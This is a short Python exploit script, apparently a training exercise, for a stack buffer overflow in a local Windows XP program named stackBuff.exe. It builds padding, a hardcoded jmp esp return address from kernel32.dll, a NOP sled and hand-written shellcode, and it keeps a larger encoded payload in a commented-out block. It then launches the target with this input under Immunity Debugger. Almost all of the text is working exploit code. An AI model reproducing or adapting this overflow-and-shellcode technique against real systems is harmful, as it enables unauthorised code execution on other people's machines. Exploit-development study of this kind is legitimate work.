# --------------------------------------
# 
# --------------------------------------
import os,subprocess

#junk = ("A"*300)

#junk = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"

junk = "A"*140
# 0x7c86467b : jmp esp |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\kernel32.dll)
junk += "\x7b\x46\x86\x7c"

junk += "\x90"*20

shellcode = ("\xCC\x31\xC9"
"\x51"
"\x68\x63\x65\x6C\x6C"
"\x68\x66\x72\x65\x65"
"\x54"  
"\xB8\xC7\x93\xBF\x77"
"\xFF\xD0")

"""
buf =  ""
buf += "\xbe\x97\xfc\x21\x4b\xdb\xd5\xd9\x74\x24\xf4\x58\x33"
buf += "\xc9\xb1\x31\x31\x70\x13\x83\xc0\x04\x03\x70\x98\x1e"
buf += "\xd4\xb7\x4e\x5c\x17\x48\x8e\x01\x91\xad\xbf\x01\xc5"
buf += "\xa6\xef\xb1\x8d\xeb\x03\x39\xc3\x1f\x90\x4f\xcc\x10"
buf += "\x11\xe5\x2a\x1e\xa2\x56\x0e\x01\x20\xa5\x43\xe1\x19"
buf += "\x66\x96\xe0\x5e\x9b\x5b\xb0\x37\xd7\xce\x25\x3c\xad"
buf += "\xd2\xce\x0e\x23\x53\x32\xc6\x42\x72\xe5\x5d\x1d\x54"
buf += "\x07\xb2\x15\xdd\x1f\xd7\x10\x97\x94\x23\xee\x26\x7d"
buf += "\x7a\x0f\x84\x40\xb3\xe2\xd4\x85\x73\x1d\xa3\xff\x80"
buf += "\xa0\xb4\x3b\xfb\x7e\x30\xd8\x5b\xf4\xe2\x04\x5a\xd9"
buf += "\x75\xce\x50\x96\xf2\x88\x74\x29\xd6\xa2\x80\xa2\xd9"
buf += "\x64\x01\xf0\xfd\xa0\x4a\xa2\x9c\xf1\x36\x05\xa0\xe2"
buf += "\x99\xfa\x04\x68\x37\xee\x34\x33\x5d\xf1\xcb\x49\x13"
buf += "\xf1\xd3\x51\x03\x9a\xe2\xda\xcc\xdd\xfa\x08\xa9\x12"
buf += "\xb1\x11\x9b\xba\x1c\xc0\x9e\xa6\x9e\x3e\xdc\xde\x1c"
buf += "\xcb\x9c\x24\x3c\xbe\x99\x61\xfa\x52\xd3\xfa\x6f\x55"
buf += "\x40\xfa\xa5\x36\x07\x68\x25\x97\xa2\x08\xcc\xe7"
"""

junk += shellcode

#junk += "C"* (300 - len(junk))

debuggercmd = "C:\\Archivos de programa\\Immunity Inc\\Immunity Debugger\\ImmunityDebugger.exe"
subprocess.call([debuggercmd,"stackBuff.exe",junk])